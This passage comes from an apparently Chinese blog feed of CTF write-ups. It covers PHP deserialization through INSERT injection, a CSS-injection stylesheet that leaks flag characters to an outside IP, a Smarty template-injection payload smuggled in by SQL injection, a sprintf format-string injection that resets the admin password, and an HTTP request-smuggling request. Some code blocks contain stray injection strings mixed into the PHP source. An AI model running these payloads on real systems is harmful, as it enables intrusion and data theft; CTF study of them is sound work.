class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line">    <span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">    $array = <span class="keyword">array</span>();</span><br><span class="line">    $array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">    $array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">    $array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">    $img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    $my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">    $array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">    $id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line">    <span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">        $rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    $filename = $info[<span class="string">"name"</span>];</span><br><span class="line">    $ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">    $cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    $con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">    <span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">    &#125;</span><br><span class="line">    $sql_fields = <span class="keyword">array</span>();</span><br><span class="line">    $sql_val = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        $key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">        $value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">        $sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">        $sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">    &#125;                                                                           <span class="string">','</span><span class="string">','</span><span class="string">','</span><span class="number">1</span><span class="string">');insert into images (`title`,`filename`,`ext`,`attr`) VALUES('</span></span><br><span class="line">    $sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">    insert into images(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>) values(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>),(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    mysqli_query($con, $sql);</span><br><span class="line">    $id = mysqli_insert_id($con);</span><br><span class="line">    mysqli_close($con);</span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        <span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">    &#125;</span><br><span class="line">    $content = file_get_contents($path);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment"># Read some config html</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>helper类存在一些漏洞点</p><p>触发点还是明显的通过__destruct触发view_files去任意读文件，找一下触发点，在show.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">    $result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">            <span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">                $attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">                $attr = unserialize($attr_temp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只对attr字段进行反序列化，所以我们要把attr字段放入我们的序列化数据，看这道题出现的\0\0\0和chr(0).’*’.chr(0)字段，就想起了前段时间看到的Joomla rce，导致我开始的思路有点偏..浪费了不少时间，其实和这个rce并没有关系..</p><p>首先可以发现在helper.php中存在insert注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">    $key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">    $value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">    $sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">    $sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;                                                                           <span class="string">','</span><span class="string">','</span><span class="string">','</span><span class="number">1</span><span class="string">');insert into images (`title`,`filename`,`ext`,`attr`) VALUES('</span></span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">insert into images(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>) values(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>),(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure><p>并没有对输入进去的数据进行处理，单引号即可闭合，然后就是一个坑点了.其实到了这步思路就很清晰了，通过insert注入把我们的序列化数据注入，然后触发show.php的反序列化直接拿到flag,接下来就是我自己的踩坑记了</p><p>首先踩了Insert注入这个坑</p><p>题目提示源码泄露，拿到的源码通过upload函数可以看出其实是四个字段的..</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br></pre></td></tr></table></figure><p>但是我正常去注入的话一直在回显error，其实是五个字段…，从比赛的源码也可以看出泄露的和正在运行的确实是不太一样的</p><p>后来就感觉…注入肯定是没有问题的，就又多加了一个字段，结果成了…</p><p>当时想着注入进去，那肯定直接拿flag了，结果并没有..</p><p>后来才意识到自己的错误，我注入进去的数据是经过url编码的数据</p><p>在平时我们传入url编码的payload是会经过浏览器去处理的，也就是会解码一遍，而这个直接注入进去，burpsuite并不会给文件名自动解码，所以无法反序列化拿到flag,但是这里确实有个protected变量要去处理，结合insert插入16进制编码后的字符串，我们可以直接插入payload的十六进制，这样就可以处理protected变量了</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="keyword">True</span>; </span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=<span class="keyword">new</span> helper;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize($c));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/Quc6T1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/02/Quc6T1.md.png" alt="Quc6T1.md.png"></a></p><p>访问下show.php触发一下，拿到flag.</p><h3 id="cssgame"><a href="#cssgame" class="headerlink" title="cssgame"></a>cssgame</h3><p>这道题…可能当时没吃饭有点昏，当时简直就是人间迷惑行为…我竟然想去闭合双引号？？？</p><p>link标签</p><p><a href="https://imgse.com/i/Quvx0A" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/02/Quvx0A.md.png" alt="Quvx0A.md.png"></a></p><p>当然这里的href不仅可以引入内部css，还可以去引入外部css，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx&#x2F;1.css</span><br></pre></td></tr></table></figure><p>可以想到之前Smi1e师傅的css注入文章..那接下来就很简单了…</p><p>vps上写个test.css，内容如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"flag"</span>]</span><span class="selector-attr">[value^=<span class="string">"b"</span>]</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"http://139.224.236.99:8967/b"</span>);&#125;</span><br></pre></td></tr></table></figure><p>题目提交<a href="http://vps/test.vss,服务器上监听一下端口" target="_blank" rel="noopener">http://vps/test.vss,服务器上监听一下端口</a></p><p><img src="https://s2.ax1x.com/2019/12/02/Qux5jg.png" alt="Qux5jg.png"></p><p>剩下的字符自动化或者手动探测一下就可以了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;周末来打了一下这个比赛，比赛质量蛮好的，差一点就三个一血了，执着于调试Tp6的pop了，后来发现换一个pop就好了(错失了一血)，反思下了自
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019D^3CTF 题目复现</title>
    <link href="http://yoursite.com/2019/11/28/2019D-3CTF-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/28/2019D-3CTF-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-28T09:57:49.000Z</published>
    <updated>2019-11-28T09:58:30.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末去打了比赛，也就错过了这个高质量比赛，所以特地来复现一下，题目真的很不错，出题师傅们辛苦了，不过并没有都复现完，最后有一些环境都关掉了，我对那个csp bypass蛮感兴趣的，如果放了环境的话，可以再复现一下。</p><h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>index函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;session-&gt;has_userdata(<span class="string">'userId'</span>)) &#123;</span><br><span class="line">$userView = <span class="keyword">$this</span>-&gt;Render_model-&gt;get_view(<span class="keyword">$this</span>-&gt;session-&gt;userId);</span><br><span class="line">$prouserView = <span class="string">'data:,'</span> . $userView;</span><br><span class="line"><span class="keyword">$this</span>-&gt;username = <span class="keyword">array</span>(<span class="string">'username'</span> =&gt; <span class="keyword">$this</span>-&gt;getUsername(<span class="keyword">$this</span>-&gt;session-&gt;userId));</span><br><span class="line"><span class="keyword">$this</span>-&gt;ci_smarty-&gt;assign(<span class="string">'username'</span>, <span class="keyword">$this</span>-&gt;username);</span><br><span class="line"><span class="keyword">$this</span>-&gt;ci_smarty-&gt;display($prouserView);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">redirect(<span class="string">'/user/login'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进get_view函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_view</span><span class="params">($userId)</span></span>&#123;</span><br><span class="line">$res = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT username FROM userTable WHERE userId='$userId'"</span>)-&gt;result();</span><br><span class="line"><span class="keyword">if</span>($res)&#123;</span><br><span class="line">$username = $res[<span class="number">0</span>]-&gt;username;</span><br><span class="line">$username = <span class="keyword">$this</span>-&gt;sql_safe($username);</span><br><span class="line">$username = <span class="keyword">$this</span>-&gt;safe_render($username);</span><br><span class="line">$userView = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT userView FROM userRender WHERE username='$username'"</span>)-&gt;result();</span><br><span class="line">$userView = $userView[<span class="number">0</span>]-&gt;userView;</span><br><span class="line"><span class="keyword">return</span> $userView;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sql_safe与safe_render函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">safe_render</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$username = str_replace(<span class="keyword">array</span>(<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>),<span class="string">''</span>,$username);</span><br><span class="line"><span class="keyword">return</span> $username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)/i'</span>,$sql))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就会产生一个问题，我们可以通过un{ion这样的形式来bypass union select的过滤，并且可以通过username处的注入点来union select 进smarty模板注入的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$userView = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT userView FROM userRender WHERE username='$username'"</span>)-&gt;result();</span><br></pre></td></tr></table></figure><p>payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test<span class="string">' union select 0x7b7b7068707d7d706870696e666f28293b7b7b2f7068707d7d # //十六进制转字符串为&#123;&#123;php&#125;&#125;phpinfo();&#123;&#123;/php&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>登陆进去后可以看到phpinfo的信息</p><p>改一下payload，写个一句话，执行下命令就可以了</p><h3 id="Showhub"><a href="#Showhub" class="headerlink" title="Showhub"></a>Showhub</h3><p>首先需要我们拿到admin账号的权限，并且题目给了部分代码，在sql语句部分存在sprintf格式化字符串漏洞，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepareInsert</span><span class="params">($baseSql, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($args)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($args <span class="keyword">as</span> $column =&gt; $value) &#123;</span><br><span class="line">            $value = addslashes($value);</span><br><span class="line">            <span class="keyword">if</span> ($value !== <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($i !== count($args) - <span class="number">1</span>) &#123;</span><br><span class="line">                    $baseSql = sprintf($baseSql, <span class="string">"`$column`,%s"</span>, <span class="string">"'$value',%s"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $baseSql = sprintf($baseSql, <span class="string">"`$column`"</span>, <span class="string">"'$value'"</span>);</span><br><span class="line">                &#125; <span class="comment">//INSERT INTO `$this-&gt;tbname`(%s) VALUE(%s)</span></span><br><span class="line">            &#125;</span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>参考这篇文章构造</p><p><a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="noopener">https://www.cnblogs.com/test404/p/7821884.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%$&#39;,sleep(3))#</span><br></pre></td></tr></table></figure><p>成功延时，存在此注入漏洞，</p><p>不过在复现的时候好像环境有点问题，随便admin xxx就可以signup进去admin，在Nu1L的wp的姿势是</p><blockquote><p>利⽤ ON DUPLICATE KEY UPDATE ,当insert已经存在的记录时，执⾏Update</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;sha256(pass)%1$&#39;#</span><br></pre></td></tr></table></figure><p>通过此payload改完密码，以admin的身份进行登陆</p><p>登陆进去后有websole,不过需要特定的ip，并且可以看到服务器是Server: ATS/7.1.2，这个服务器是存在http走私漏洞的</p><p>通过走私GET请求到webconsole</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 586</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /WebConsole HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">client-ip</span>: x.xxx.xx.x</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: 